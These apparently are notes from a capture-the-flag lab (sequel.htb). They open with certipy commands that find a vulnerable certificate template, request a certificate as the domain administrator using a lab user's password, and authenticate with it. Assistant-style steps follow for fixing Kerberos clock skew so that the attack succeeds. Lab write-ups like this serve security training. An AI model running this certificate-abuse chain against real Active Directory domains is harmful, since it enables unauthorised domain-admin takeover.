
```
certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
```

```
certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
```

```
certipy auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202

```

```
certipy auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202
```





## The problem (in two lines)

Kerberos (and PKINIT) requires your computer’s clock to match the Domain Controller’s clock.  
If your clock is behind/ahead, the DC will refuse authentication with `KRB_AP_ERR_SKEW` or the cert will be “not yet valid”.

## The fix (in two lines)

Make your machine’s clock match the DC’s clock (or at least be after the certificate `Not Before` time). Then re-run the cert/Kerberos command.

---

## Simple steps you can paste (do these in order)

1. Check your time and the DC offset (just copy/paste):
    

```bash
date -u
ntpdate -q 10.10.11.202
```

What to look for: `date -u` is your UTC time. `ntpdate -q` shows `offset +NNN` — positive means the DC is ahead by NNN seconds.

2. If the DC is ahead (offset positive), set your clock to the DC time automatically:
    

```bash
# compute DC time from offset and set your UTC clock to match it
DC_TIME=$(ntpdate -q 10.10.11.202 2>/dev/null | awk '/offset/ {print strftime("%Y-%m-%d %H:%M:%S", systime()+$6); exit}')
echo "Setting UTC to: $DC_TIME"
sudo date -u -s "$DC_TIME"
date -u
```

If that one-liner errors for you, run the two lines it prints: `sudo date -u -s "YYYY-MM-DD HH:MM:SS"` then `date -u`.

3. If the clock keeps jumping back, stop automatic sync first, then set time:


```bash
sudo systemctl stop systemd-timesyncd 2>/dev/null || true
sudo systemctl stop ntp 2>/dev/null || true
sudo systemctl stop chronyd 2>/dev/null || true
# then set time (example: replace datetime with DC time if needed)
sudo date -u -s "2025-09-23 18:16:31"
date -u
```

4. Re-run your cert/Kerberos command:
    

```bash
certipy auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202
```

5. When you’re done, restore real time and re-enable sync:
    

```bash
sudo ntpdate -u pool.ntp.org
sudo systemctl enable --now systemd-timesyncd 2>/dev/null || sudo systemctl enable --now ntp 2>/dev/null || true
timedatectl status
date -u
```

---

## One-sentence reminders

- Problem = clocks don’t match → Kerberos refuses you.
    
- Fix = match your clock to the DC (or to the cert’s `Not Before`) → Kerberos accepts the cert.
    

## Quick tip / gotcha

If you create a Kerberos ticket while your clock is wrong, that ticket will probably stop working when you reset the real time — copy any `*.ccache` file you want to keep before restoring correct time.

---

If you want, I’ll make this into a tiny 10-line script you can drop in `~/bin/fix_time.sh` and run whenever you hit `KRB_AP_ERR_SKEW`. Say “yes script” and I’ll output it ready to save.